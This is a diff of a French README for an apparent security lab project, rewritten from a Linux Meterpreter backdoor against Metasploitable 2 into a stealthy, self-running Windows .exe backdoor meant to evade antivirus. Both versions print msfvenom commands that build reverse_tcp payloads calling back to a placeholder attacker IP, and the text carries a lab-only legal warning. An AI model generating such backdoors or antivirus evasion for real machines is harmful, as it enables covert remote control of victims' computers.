@@ -1,27 +1,27 @@
-# Sujet-3
- Créer un backdoor sur une cible et s’y connecter depuis une machine attaquante
+# Sujet 3 – Backdoor Windows .EXE auto-exécutable + Bypass antivirus (Kali)
 
-Ce projet démontre la création et l'utilisation d'un **backdoor** pour obtenir un accès distant à une machine cible vulnérable, à l’aide de **Kali Linux** et **Metasploit**.
+Ce projet illustre la création d’un **backdoor Windows** à l’aide de Kali Linux, avec comme objectif :
 
----
+✅ Générer un fichier `.exe`  
+✅ Se connecter automatiquement à la machine Kali à l'exécution  
+✅ Masquer le comportement (furtif)  
+✅ Contourner les antivirus dans un environnement de test
 
-## 🧰 Environnement utilisé
-
-- 🎯 **Machine cible** : Metasploitable 2 (Linux)
-- 💻 **Machine attaquante** : Kali Linux
-- 🔧 **Outils** :
-  - `msfvenom`
-  - `msfconsole`
-  - `python3 -m http.server` (ou autre méthode de transfert)
-  - `wget` ou `curl` sur la machine cible
+>  **Avertissement légal** : Ce projet est exclusivement réservé à un usage éducatif dans un **lab de test** sous **autorisation**. Toute utilisation non autorisée constitue une infraction pénale.
 
 ---
 
-## 📌 Étapes
+## Outils nécessaires
 
-### 1️⃣ Générer le backdoor avec `msfvenom`
+- Kali Linux (attaquant)
+- Machine Windows (victime – test en VM uniquement)
+- Metasploit
+- `msfvenom`
+---
 
-Sur Kali Linux :
+## Étape 1 – Générer un backdoor `.exe` Windows avec `msfvenom`
+
+Sur Kali :
 
 ```bash
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=4444 -f elf > backdoor.elf
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_KALI> LPORT=4444 -f exe -o backdoor.exe
